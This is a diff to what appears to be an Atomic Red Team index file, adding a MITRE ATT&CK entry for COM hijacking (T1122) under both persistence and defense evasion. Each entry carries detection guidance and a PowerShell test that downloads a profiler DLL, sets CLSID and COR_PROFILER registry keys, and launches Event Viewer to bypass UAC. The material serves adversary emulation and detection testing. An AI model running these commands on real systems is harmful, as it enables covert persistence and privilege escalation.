@@ -1098,6 +1098,122 @@ persistence:
         cleanup_command: 'assoc .hta=htafile
 
 '
+  T1122:
+    technique:
+      x_mitre_permissions_required:
+      - User
+      x_mitre_data_sources:
+      - Windows Registry
+      - DLL monitoring
+      - Loaded DLLs
+      name: Component Object Model Hijacking
+      description: 'The Component Object Model (COM) is a system within Windows to
+        enable interaction between software components through the operating system.
+        (Citation: Microsoft Component Object Model) Adversaries can use this system
+        to insert malicious code that can be executed in place of legitimate software
+        through hijacking the COM references and relationships as a means for persistence.
+        Hijacking a COM object requires a change in the Windows Registry to replace
+        a reference to a legitimate system component which may cause that component
+        to not work when executed. When that system component is executed through
+        normal system operation the adversary''s code will be executed instead. (Citation:
+        GDATA COM Hijacking) An adversary is likely to hijack objects that are used
+        frequently enough to maintain a consistent level of persistence, but are unlikely
+        to break noticeable functionality within the system as to avoid system instability
+        that could lead to detection.'
+      id: attack-pattern--9b52fca7-1a36-4da0-b62d-da5bd83b4d69
+      modified: '2019-04-18T16:41:28.889Z'
+      x_mitre_platforms:
+      - Windows
+      object_marking_refs:
+      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
+      x_mitre_version: '1.0'
+      type: attack-pattern
+      x_mitre_detection: 'There are opportunities to detect COM hijacking by searching
+        for Registry references that have been replaced and through Registry operations
+        replacing know binary paths with unknown paths. Even though some third party
+        applications define user COM objects, the presence of objects within <code>HKEY_CURRENT_USER\Software\Classes\CLSID\</code>
+        may be anomalous and should be investigated since user objects will be loaded
+        prior to machine objects in <code>HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\</code>.
+        (Citation: Endgame COM Hijacking) Registry entries for existing COM objects
+        may change infrequently. When an entry with a known good path and binary is
+        replaced or changed to an unusual value to point to an unknown binary in a
+        new location, then it may indicate suspicious behavior and should be investigated.
+        Likewise, if software DLL loads are collected and analyzed, any unusual DLL
+        load that can be correlated with a COM object Registry modification may indicate
+        COM hijacking has been performed.'
+      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
+      x_mitre_contributors:
+      - ENDGAME
+      created: '2017-05-31T21:31:33.979Z'
+      kill_chain_phases:
+      - kill_chain_name: mitre-attack
+        phase_name: defense-evasion
+      - kill_chain_name: mitre-attack
+        phase_name: persistence
+      external_references:
+      - external_id: T1122
+        source_name: mitre-attack
+        url: https://attack.mitre.org/techniques/T1122
+      - source_name: Microsoft Component Object Model
+        description: Microsoft. (n.d.). The Component Object Model. Retrieved August
+          18, 2016.
+        url: https://msdn.microsoft.com/library/ms694363.aspx
+      - source_name: GDATA COM Hijacking
+        description: 'G DATA. (2014, October). COM Object hijacking: the discreet
+          way of persistence. Retrieved August 13, 2016.'
+        url: https://blog.gdatasoftware.com/2014/10/23941-com-object-hijacking-the-discreet-way-of-persistence
+      - source_name: Endgame COM Hijacking
+        description: 'Ewing, P. Strom, B. (2016, September 15). How to Hunt: Detecting
+          Persistence & Evasion with the COM. Retrieved September 15, 2016.'
+        url: https://www.endgame.com/blog/how-hunt-detecting-persistence-evasion-com
+      x_mitre_defense_bypassed:
+      - Autoruns Analysis
+      identifier: T1122
+    atomic_tests:
+    - name: COM Hijack Leveraging .NET profiler DLL
+      description: "Creates environment variables and CLSID to enable a .NET profiler.
+        The profiler DLL (`atomicNotepad.dll`) executes when the CLR is loaded by
+        the Event Viewer process. Additionally, the profiling DLL will inherit the
+        integrity level of Event Viewer bypassing UAC and executing `notepad.exe`
+        with high integrity. If the account used is not a local administrator the
+        profiler DLL will still execute each time the CLR is loaded by a process,
+        however, the notepad process will not execute with high integrity. \n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        file_name:
+          description: profiler DLL
+          type: Path
+          default: PathToAtomicsFolder\T1122\bin\T1122x64.dll
+        clsid_guid:
+          description: custom clsid guid
+          type: String
+          default: "{09108e71-974c-4010-89cb-acf471ae9e2c}"
+      dependency_executor_name: powershell
+      dependencies:
+      - description: "#{file_name} must be present"
+        prereq_command: 'if (Test-Path #{file_name}) {exit 0} else {exit 1}'
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{file_name}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1122/bin/T1122x64.dll" -OutFile "#{file_name}"
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          Write-Host "Creating registry keys in HKCU:Software\Classes\CLSID\#{clsid_guid}" -ForegroundColor Cyan
+          New-Item -Path "HKCU:\Software\Classes\CLSID\#{clsid_guid}\InprocServer32" -Value #{file_name} -Force | Out-Null
+          New-ItemProperty -Path HKCU:\Environment -Name "COR_ENABLE_PROFILING" -PropertyType String -Value "1" -Force | Out-Null
+          New-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER" -PropertyType String -Value "#{clsid_guid}" -Force | Out-Null
+          New-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER_PATH" -PropertyType String -Value #{file_name} -Force | Out-Null
+          Write-Host "executing eventvwr.msc" -ForegroundColor Cyan
+          START MMC.EXE EVENTVWR.MSC
+          Start-Sleep 5
+        cleanup_command: |-
+          Write-Host "Removing registry keys" -ForegroundColor Cyan
+          Remove-Item -Path "HKCU:\Software\Classes\CLSID\#{clsid_guid}" -Recurse -Force
+          Remove-ItemProperty -Path HKCU:\Environment -Name "COR_ENABLE_PROFILING" -Force | Out-Null
+          Remove-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER" -Force | Out-Null
+          Remove-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER_PATH" -Force | Out-Null
   T1136:
     technique:
       x_mitre_permissions_required:
@@ -6308,6 +6424,122 @@ defense-evasion:
         command: 'hh.exe #{remote_chm_file}
 
 '
+  T1122:
+    technique:
+      x_mitre_permissions_required:
+      - User
+      x_mitre_data_sources:
+      - Windows Registry
+      - DLL monitoring
+      - Loaded DLLs
+      name: Component Object Model Hijacking
+      description: 'The Component Object Model (COM) is a system within Windows to
+        enable interaction between software components through the operating system.
+        (Citation: Microsoft Component Object Model) Adversaries can use this system
+        to insert malicious code that can be executed in place of legitimate software
+        through hijacking the COM references and relationships as a means for persistence.
+        Hijacking a COM object requires a change in the Windows Registry to replace
+        a reference to a legitimate system component which may cause that component
+        to not work when executed. When that system component is executed through
+        normal system operation the adversary''s code will be executed instead. (Citation:
+        GDATA COM Hijacking) An adversary is likely to hijack objects that are used
+        frequently enough to maintain a consistent level of persistence, but are unlikely
+        to break noticeable functionality within the system as to avoid system instability
+        that could lead to detection.'
+      id: attack-pattern--9b52fca7-1a36-4da0-b62d-da5bd83b4d69
+      modified: '2019-04-18T16:41:28.889Z'
+      x_mitre_platforms:
+      - Windows
+      object_marking_refs:
+      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
+      x_mitre_version: '1.0'
+      type: attack-pattern
+      x_mitre_detection: 'There are opportunities to detect COM hijacking by searching
+        for Registry references that have been replaced and through Registry operations
+        replacing know binary paths with unknown paths. Even though some third party
+        applications define user COM objects, the presence of objects within <code>HKEY_CURRENT_USER\Software\Classes\CLSID\</code>
+        may be anomalous and should be investigated since user objects will be loaded
+        prior to machine objects in <code>HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\</code>.
+        (Citation: Endgame COM Hijacking) Registry entries for existing COM objects
+        may change infrequently. When an entry with a known good path and binary is
+        replaced or changed to an unusual value to point to an unknown binary in a
+        new location, then it may indicate suspicious behavior and should be investigated.
+        Likewise, if software DLL loads are collected and analyzed, any unusual DLL
+        load that can be correlated with a COM object Registry modification may indicate
+        COM hijacking has been performed.'
+      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
+      x_mitre_contributors:
+      - ENDGAME
+      created: '2017-05-31T21:31:33.979Z'
+      kill_chain_phases:
+      - kill_chain_name: mitre-attack
+        phase_name: defense-evasion
+      - kill_chain_name: mitre-attack
+        phase_name: persistence
+      external_references:
+      - external_id: T1122
+        source_name: mitre-attack
+        url: https://attack.mitre.org/techniques/T1122
+      - source_name: Microsoft Component Object Model
+        description: Microsoft. (n.d.). The Component Object Model. Retrieved August
+          18, 2016.
+        url: https://msdn.microsoft.com/library/ms694363.aspx
+      - source_name: GDATA COM Hijacking
+        description: 'G DATA. (2014, October). COM Object hijacking: the discreet
+          way of persistence. Retrieved August 13, 2016.'
+        url: https://blog.gdatasoftware.com/2014/10/23941-com-object-hijacking-the-discreet-way-of-persistence
+      - source_name: Endgame COM Hijacking
+        description: 'Ewing, P. Strom, B. (2016, September 15). How to Hunt: Detecting
+          Persistence & Evasion with the COM. Retrieved September 15, 2016.'
+        url: https://www.endgame.com/blog/how-hunt-detecting-persistence-evasion-com
+      x_mitre_defense_bypassed:
+      - Autoruns Analysis
+      identifier: T1122
+    atomic_tests:
+    - name: COM Hijack Leveraging .NET profiler DLL
+      description: "Creates environment variables and CLSID to enable a .NET profiler.
+        The profiler DLL (`atomicNotepad.dll`) executes when the CLR is loaded by
+        the Event Viewer process. Additionally, the profiling DLL will inherit the
+        integrity level of Event Viewer bypassing UAC and executing `notepad.exe`
+        with high integrity. If the account used is not a local administrator the
+        profiler DLL will still execute each time the CLR is loaded by a process,
+        however, the notepad process will not execute with high integrity. \n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        file_name:
+          description: profiler DLL
+          type: Path
+          default: PathToAtomicsFolder\T1122\bin\T1122x64.dll
+        clsid_guid:
+          description: custom clsid guid
+          type: String
+          default: "{09108e71-974c-4010-89cb-acf471ae9e2c}"
+      dependency_executor_name: powershell
+      dependencies:
+      - description: "#{file_name} must be present"
+        prereq_command: 'if (Test-Path #{file_name}) {exit 0} else {exit 1}'
+        get_prereq_command: |-
+          New-Item -Type Directory (split-path #{file_name}) -ErrorAction ignore | Out-Null
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1122/bin/T1122x64.dll" -OutFile "#{file_name}"
+      executor:
+        name: powershell
+        elevation_required: false
+        command: |
+          Write-Host "Creating registry keys in HKCU:Software\Classes\CLSID\#{clsid_guid}" -ForegroundColor Cyan
+          New-Item -Path "HKCU:\Software\Classes\CLSID\#{clsid_guid}\InprocServer32" -Value #{file_name} -Force | Out-Null
+          New-ItemProperty -Path HKCU:\Environment -Name "COR_ENABLE_PROFILING" -PropertyType String -Value "1" -Force | Out-Null
+          New-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER" -PropertyType String -Value "#{clsid_guid}" -Force | Out-Null
+          New-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER_PATH" -PropertyType String -Value #{file_name} -Force | Out-Null
+          Write-Host "executing eventvwr.msc" -ForegroundColor Cyan
+          START MMC.EXE EVENTVWR.MSC
+          Start-Sleep 5
+        cleanup_command: |-
+          Write-Host "Removing registry keys" -ForegroundColor Cyan
+          Remove-Item -Path "HKCU:\Software\Classes\CLSID\#{clsid_guid}" -Recurse -Force
+          Remove-ItemProperty -Path HKCU:\Environment -Name "COR_ENABLE_PROFILING" -Force | Out-Null
+          Remove-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER" -Force | Out-Null
+          Remove-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER_PATH" -Force | Out-Null
   T1090:
     technique:
       x_mitre_data_sources:
